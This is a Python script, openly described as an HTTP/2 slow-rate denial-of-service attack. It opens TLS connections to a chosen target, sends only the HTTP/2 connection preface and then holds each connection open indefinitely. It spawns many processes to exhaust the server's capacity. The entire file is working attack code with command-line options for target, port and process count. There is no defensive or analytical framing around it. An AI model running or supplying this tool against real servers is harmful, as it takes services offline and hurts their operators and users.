#!/usr/bin/python3
"""
HTTP/2 Slow Rate DoS Attack Script using Connection Preface
This script establishes an HTTP/2 connection and sends only the Connection Preface without
sending any HTTP request, causing the server to wait indefinitely for the request.

Usage:
    python slowrateDoS_connection_preface.py --target <hostname> --port <port> --process <number_of_processes> --delay <delay_time>

Arguments:
    -t, --target   : Target hostname or IP address (required)
    -p, --port     : Target port (default: 443)
    -P, --process  : Number of attack processes to spawn (default: 1)
    -d, --delay    : Delay between starting each process in seconds (default: 0.1)
"""

import socket
import ssl
import h2.connection
import argparse
import time
from multiprocessing import Process

def establish_tls_connection(host, port):
    """
    Establishes an SSL/TLS connection to the target server supporting HTTP/2.
    """
    try:
        context = ssl.create_default_context()
        context.set_alpn_protocols(['h2'])  # Specify HTTP/2 as the desired protocol
        sock = socket.create_connection((host, port))
        tls_sock = context.wrap_socket(sock, server_hostname=host)
        return tls_sock
    except Exception as e:
        print(f"Error establishing TLS connection: {e}")
        exit(1)

def send_connection_preface_only(tls_sock):
    """
    Sends only the HTTP/2 Connection Preface to the target server and does not send any GET or POST request.
    """
    try:
        # Initialize the HTTP/2 connection
        conn = h2.connection.H2Connection()
        conn.initiate_connection()
        
        # Send only the Connection Preface
        tls_sock.sendall(conn.data_to_send())
        print("Connection preface sent. Server is waiting for an HTTP request...")

        # Loop to keep the connection open without sending any request
        while True:
            # Wait indefinitely without sending further data
            time.sleep(10)
    except Exception as e:
        print(f"Error during the attack: {e}")
    finally:
        tls_sock.close()

def main():
    """
    Main function to perform the Slow Rate DoS attack by sending only the Connection Preface.
    """
    tls_sock = establish_tls_connection(args.target, args.port)
    send_connection_preface_only(tls_sock)

if __name__ == "__main__":
    # Argument parsing for command-line options
    parser = argparse.ArgumentParser(description="Perform a Slow Rate DoS attack using Connection Preface over HTTP/2.")
    parser.add_argument('-t', '--target', type=str, required=True, help="Target hostname or IP address.")
    parser.add_argument('-p', '--port', type=int, default=443, help="Target port (default: 443).")
    parser.add_argument('-P', '--process', type=int, default=1, help="Number of processes to spawn (default: 1).")
    parser.add_argument('-d', '--delay', type=float, default=0.1, help="Delay between spawning processes in seconds (default: 0.1).")

    args = parser.parse_args()

    process_list = []

    # Spawn the specified number of processes
    for i in range(args.process):
        process = Process(target=main, daemon=True)
        process_list.append(process)
        process.start()
        time.sleep(args.delay)

    # Join the processes to wait for their completion
    for process in process_list:
        if process.is_alive():
            process.join()

